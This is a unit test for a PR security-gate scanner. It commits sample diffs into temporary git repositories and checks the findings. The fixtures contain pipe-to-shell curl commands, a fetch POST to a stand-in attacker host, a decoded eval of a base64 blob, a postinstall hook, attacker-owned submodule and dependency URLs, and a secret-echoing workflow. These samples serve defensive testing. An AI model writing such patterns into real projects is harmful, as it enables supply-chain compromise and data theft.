#!/usr/bin/env node
// Unit test for scripts/pr-security-scan.mjs, the PR security gate's diff scan.
//
// It runs against real throwaway git repositories rather than fixture strings,
// because the half of the scanner most likely to break silently is the diff
// parsing -- a hunk header misread by one shifts every line number, and a rule
// that never matches anything looks exactly like a clean PR. The security
// workflow runs this before it runs the scan, so a gate that has stopped
// detecting anything fails the job instead of passing every PR.

import { execFileSync } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";

import { scan } from "../scripts/pr-security-scan.mjs";

let failures = 0;
const cwd0 = process.cwd();

function check(name, cond, extra = "") {
  if (cond) {
    console.log(`  ok   ${name}`);
  } else {
    failures++;
    console.log(`  FAIL ${name}${extra ? ` — ${extra}` : ""}`);
  }
}

// Build a repo with `basefiles` committed, then `headfiles` on top, and scan the
// difference. Values are file contents; null deletes.
function scanRepo(basefiles, headfiles) {
  const dir = mkdtempSync(path.join(tmpdir(), "prsec-"));
  const git = (...args) => execFileSync("git", args, { cwd: dir, encoding: "utf8" });
  const write = (files) => {
    for (const [f, content] of Object.entries(files)) {
      const full = path.join(dir, f);
      mkdirSync(path.dirname(full), { recursive: true });
      writeFileSync(full, content);
    }
  };
  git("init", "-q", "-b", "main");
  git("config", "user.email", "t@example.com");
  git("config", "user.name", "t");
  write(basefiles);
  git("add", "-A");
  git("commit", "-q", "-m", "base");
  const base = git("rev-parse", "HEAD").trim();
  write(headfiles);
  git("add", "-A");
  git("commit", "-q", "-m", "head");
  const head = git("rev-parse", "HEAD").trim();

  process.chdir(dir);
  try {
    return scan({ base, head, root: dir });
  } finally {
    process.chdir(cwd0);
    rmSync(dir, { recursive: true, force: true });
  }
}

const has = (findings, rule) => findings.some((f) => f.rule === rule);
const blocking = (findings) => findings.filter((f) => f.severity === "block");

// --- an ordinary change is clean ------------------------------------------
{
  console.log("ordinary change");
  const f = scanRepo(
    { "editor/src/expr.ts": "export const two = 2;\n" },
    { "editor/src/expr.ts": "export const two = 2;\nexport const three = 3;\n" },
  );
  check("no findings", f.length === 0, JSON.stringify(f));
}

// --- line numbers survive the hunk parser ---------------------------------
{
  console.log("line numbers");
  const base = { "a.sh": "one\ntwo\nthree\nfour\n" };
  const head = { "a.sh": "one\ntwo\nthree\nfour\ncurl http://x.test/i | sh\n" };
  const f = scanRepo(base, head);
  const hit = f.find((x) => x.rule === "pipe-to-shell");
  check("pipe-to-shell found", !!hit);
  check("reported on line 5", hit && hit.line === 5, hit && `line ${hit.line}`);
}

// --- CI surface ------------------------------------------------------------
{
  console.log("workflow rules");
  const base = { "README.md": "hi\n" };
  const f = scanRepo(base, {
    ...base,
    ".github/workflows/evil.yml": [
      "on:",
      "  pull_request_target:",
      "jobs:",
      "  go:",
      "    runs-on: self-hosted",
      "    steps:",
      "      - uses: some-rando/checkout-plus@v1",
      "      - run: echo ${{ secrets.CLOUDFLARE_API_TOKEN }}",
    ].join("\n") + "\n",
  });
  check("pull_request_target blocks", has(f, "workflow-pull-request-target"));
  check("self-hosted runner blocks", has(f, "workflow-self-hosted-runner"));
  check("untrusted action blocks", has(f, "workflow-untrusted-action"));
  check("secret reference blocks", has(f, "workflow-secret-on-pr-path"));
  check("workflow change noted", has(f, "workflow-touched"));
  check("all four are blocking", blocking(f).length >= 4);
}
{
  console.log("trusted action owner is not flagged");
  const base = { "README.md": "hi\n" };
  const f = scanRepo(base, {
    ...base,
    ".github/workflows/ok.yml": "jobs:\n  a:\n    steps:\n      - uses: actions/checkout@v4\n",
  });
  check("actions/checkout allowed", !has(f, "workflow-untrusted-action"));
  check("only the advisory workflow-touched", blocking(f).length === 0, JSON.stringify(f));
}

// --- supply chain ----------------------------------------------------------
{
  console.log("supply chain");
  const base = {
    ".gitmodules": '[submodule "gnuradio"]\n\tpath = gnuradio\n\turl = https://github.com/777arc/gnuradio.git\n',
    "package.json": '{\n  "name": "x",\n  "dependencies": {\n    "puppeteer-core": "^23.11.1"\n  }\n}\n',
  };
  const f = scanRepo(base, {
    ".gitmodules": '[submodule "gnuradio"]\n\tpath = gnuradio\n\turl = https://github.com/attacker/gnuradio.git\n',
    "package.json": '{\n  "name": "x",\n  "scripts": {\n    "postinstall": "node t.js"\n  },\n' +
      '  "dependencies": {\n    "puppeteer-core": "^23.11.1",\n    "left-pad": "^1.0.0"\n  }\n}\n',
  });
  check("submodule url change blocks", has(f, "submodule-url-changed"));
  check("postinstall blocks", has(f, "npm-lifecycle-script"));
  check("new dependency warned",
    f.some((x) => x.rule === "npm-dependency-added" && /left-pad/.test(x.evidence)));
}
{
  console.log("a package.json that did not change its dependencies is quiet");
  const base = { "package.json": '{\n  "name": "x",\n  "dependencies": {\n    "a": "^1.0.0"\n  }\n}\n' };
  const f = scanRepo(base, {
    "package.json": '{\n  "name": "y",\n  "dependencies": {\n    "a": "^1.0.0"\n  }\n}\n',
  });
  check("no dependency finding", !has(f, "npm-dependency-added"), JSON.stringify(f));
}
{
  console.log("lockfile source");
  const base = { "package-lock.json": '{\n  "packages": {}\n}\n' };
  const f = scanRepo(base, {
    "package-lock.json": '{\n  "packages": {\n' +
      '    "node_modules/a": { "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz" },\n' +
      '    "node_modules/b": { "resolved": "git+ssh://git@github.com/attacker/b.git#deadbeef" }\n' +
      "  }\n}\n",
  });
  check("registry entry allowed",
    !f.some((x) => x.rule === "npm-nonregistry-source" && /registry\.npmjs/.test(x.evidence || "")));
  check("git dependency blocks", has(f, "npm-nonregistry-source"));
}
{
  console.log("package.json metadata urls are not dependency sources");
  const base = { "package.json": '{\n  "name": "x"\n}\n' };
  const f = scanRepo(base, {
    "package.json": '{\n  "name": "x",\n  "homepage": "https://gnuradioworld.com",\n' +
      '  "dependencies": {\n    "evil": "git+https://github.com/attacker/evil.git"\n  }\n}\n',
  });
  check("homepage not flagged as a source",
    !f.some((x) => x.rule === "npm-nonregistry-range" && /homepage/.test(x.evidence)),
    JSON.stringify(f.filter((x) => x.rule === "npm-nonregistry-range")));
  check("git range blocks", has(f, "npm-nonregistry-range"));
}

// --- exfiltration and obfuscation -----------------------------------------
{
  console.log("exfiltration");
  const base = { "editor/src/main.ts": "export const a = 1;\n" };
  const f = scanRepo(base, {
    "editor/src/main.ts": "export const a = 1;\n" +
      "fetch('https://collector.attacker-domain.test/x', { method: 'POST' });\n",
  });
  check("new host blocks in source", has(f, "new-outbound-host"));
  check("it is blocking",
    f.some((x) => x.rule === "new-outbound-host" && x.severity === "block"));
}
{
  console.log("known host is not a new host");
  const base = {
    "editor/src/a.ts": "const base = 'https://recordings.gnuradioworld.com';\n",
    "docs/x.md": "see https://recordings.gnuradioworld.com\n",
  };
  const f = scanRepo(base, {
    ...base,
    "editor/src/b.ts": "const same = 'https://recordings.gnuradioworld.com/index.json';\n",
  });
  check("no finding for a host already in the tree", !has(f, "new-outbound-host"), JSON.stringify(f));
}
{
  console.log("a new host in prose is advisory, not blocking");
  const base = { "docs/x.md": "hello\n" };
  const f = scanRepo(base, { "docs/x.md": "hello\nsee https://some-new-doc-host.test/page\n" });
  check("warned", has(f, "new-outbound-host"));
  check("not blocking", blocking(f).length === 0, JSON.stringify(blocking(f)));
}
{
  console.log("obfuscation");
  const base = { "editor/src/a.ts": "const a = 1;\n" };
  const f = scanRepo(base, {
    "editor/src/a.ts": "const a = 1;\n" +
      `const p = "${"QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eg".repeat(4)}";\n` +
      "eval(atob(p));\n",
  });
  check("opaque blob blocks", has(f, "opaque-blob"));
  check("decode-and-execute blocks", has(f, "decode-and-execute"));
}
{
  console.log("credentials");
  const base = { "a.txt": "x\n" };
  const f = scanRepo(base, { "a.txt": "x\nkey = sk-ant-api03-" + "A".repeat(40) + "\n" });
  check("api key literal blocks", has(f, "credential-literal"));
}

// --- browser isolation -----------------------------------------------------
{
  console.log("browser isolation");
  const base = { "server.mjs": "const port = 8090;\n" };
  const f = scanRepo(base, {
    "server.mjs": "const port = 8090;\n" +
      "res.setHeader('Cross-Origin-Embedder-Policy', 'unsafe-none');\n",
  });
  check("COEP change warned", has(f, "cross-origin-isolation"));
  check("advisory only", blocking(f).length === 0);
}

// --- suppression -----------------------------------------------------------
{
  console.log("suppression");
  const base = { "a.sh": "x\n" };
  const f = scanRepo(base, {
    "a.sh": "x\n# pr-security-scan: allow pipe-to-shell\ncurl http://y.test/i | sh\n",
  });
  check("inline allow silences the rule", !has(f, "pipe-to-shell"), JSON.stringify(f));
}
{
  console.log("allowlist file");
  const base = { "a.sh": "x\n", ".github/pr-security-allow.txt": "pipe-to-shell tools/**\n" };
  const f = scanRepo(base, {
    ...base,
    "tools/b.sh": "curl http://z.test/i | sh\n",
    "a.sh": "x\ncurl http://z.test/i | sh\n",
  });
  check("glob-matched path exempt",
    !f.some((x) => x.rule === "pipe-to-shell" && x.file === "tools/b.sh"), JSON.stringify(f));
  check("unmatched path still flagged",
    f.some((x) => x.rule === "pipe-to-shell" && x.file === "a.sh"));
}

// --- the gate guards itself ------------------------------------------------
{
  console.log("gate self-protection");
  const base = { "scripts/pr-security-scan.mjs": "// v1\n" };
  const f = scanRepo(base, { "scripts/pr-security-scan.mjs": "// v1\n// v2\n" });
  check("editing the scanner is itself blocking", has(f, "security-gate-modified"));
  check("and it is the only finding — the scanner's own patterns do not self-match",
    f.length === 1, JSON.stringify(f));
}
{
  console.log("allowlist edits are flagged");
  const base = { ".github/pr-security-allow.txt": "# none\n" };
  const f = scanRepo(base, { ".github/pr-security-allow.txt": "# none\npipe-to-shell **\n" });
  check("widening the allowlist blocks", has(f, "security-gate-modified"));
}

console.log(failures === 0
  ? "\nRESULT: PR_SECURITY_SCAN_TEST_PASS"
  : `\nRESULT: PR_SECURITY_SCAN_TEST_FAIL (${failures} failed)`);
process.exit(failures === 0 ? 0 : 1);
